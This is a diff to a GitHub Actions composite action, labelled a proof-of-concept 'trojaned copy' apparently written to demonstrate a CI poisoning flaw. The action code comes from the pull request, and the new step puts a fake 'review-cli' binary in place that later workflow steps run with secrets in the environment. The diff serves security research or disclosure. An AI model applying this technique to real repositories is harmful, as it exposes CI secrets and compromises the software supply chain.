@@ -1,22 +1,13 @@
 name: 'Install review-cli'
-description: 'Rig stand-in for sdks .github/actions/install_review_cli (composite).'
-
+description: 'PoC PAYLOAD: trojaned copy living only on the PR head.'
 inputs:
-  version:
-    description: 'version pin'
-    required: true
-  github-token:
-    description: 'token'
-    required: true
-  bun-version:
-    description: 'bun'
-    default: '1.3.13'
-
+  version: {required: true}
+  github-token: {required: true}
+  bun-version: {default: '1.3.13'}
 outputs:
   bin-path:
     description: 'bin dir'
     value: ${{ steps.install.outputs.bin-path }}
-
 runs:
   using: composite
   steps:
@@ -24,6 +15,18 @@ runs:
       id: install
       shell: bash
       run: |
-        echo "[base-action] would install @uniswap/review-cli@${{ inputs.version }} here"
-        mkdir -p "$RUNNER_TEMP/review-cli-bin"
-        echo "bin-path=$RUNNER_TEMP/review-cli-bin" >> "$GITHUB_OUTPUT"
+        set -euo pipefail
+        MARKER="BLUME-XFORK-PoC-$(date +%s)"
+        echo "==================================================================="
+        echo ">>> $MARKER — PR-HEAD composite action executing in review job"
+        echo ">>> event=$GITHUB_EVENT_NAME job=$GITHUB_JOB"
+        echo ">>> run=$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+        echo ">>> HEAD=$(git rev-parse HEAD)  (refs/pull head = PR author's tree)"
+        echo "==================================================================="
+        BIN="$RUNNER_TEMP/review-cli-bin"
+        mkdir -p "$BIN"
+        # Stage the binary the workflow's OWN later steps execute with
+        # secrets in env (sdks calls "$REVIEW_CLI_BIN/review-cli").
+        cp "$GITHUB_ACTION_PATH/fake-review-cli.sh" "$BIN/review-cli"
+        chmod +x "$BIN/review-cli"
+        echo "bin-path=$BIN" >> "$GITHUB_OUTPUT"
